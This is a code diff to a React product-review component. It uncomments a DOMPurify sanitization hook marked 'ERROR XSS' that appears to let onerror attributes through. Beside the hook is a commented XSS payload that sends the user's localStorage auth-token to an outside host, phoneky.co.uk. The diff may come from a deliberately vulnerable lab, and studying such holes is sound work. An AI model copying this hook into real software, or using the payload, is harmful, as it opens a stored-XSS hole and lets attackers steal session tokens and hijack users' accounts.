@@ -192,7 +192,7 @@ const DescriptionReviewBox = ({ product, onReviewAdded }) => {
 
     const paginate = (pageNumber) => setCurrentPage(pageNumber);
 
-    /*
+    
     //ERROR XSS
     DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
         if (data.attrName === 'onerror') {
@@ -201,7 +201,7 @@ const DescriptionReviewBox = ({ product, onReviewAdded }) => {
     });
     //<img onerror="window.location.href='https://phoneky.co.uk?token=' + localStorage.getItem('auth-token')" src="invalid-image" />
     //ERROR XSS
-    */
+    
 
     return (
         <div className='descriptionReview'>
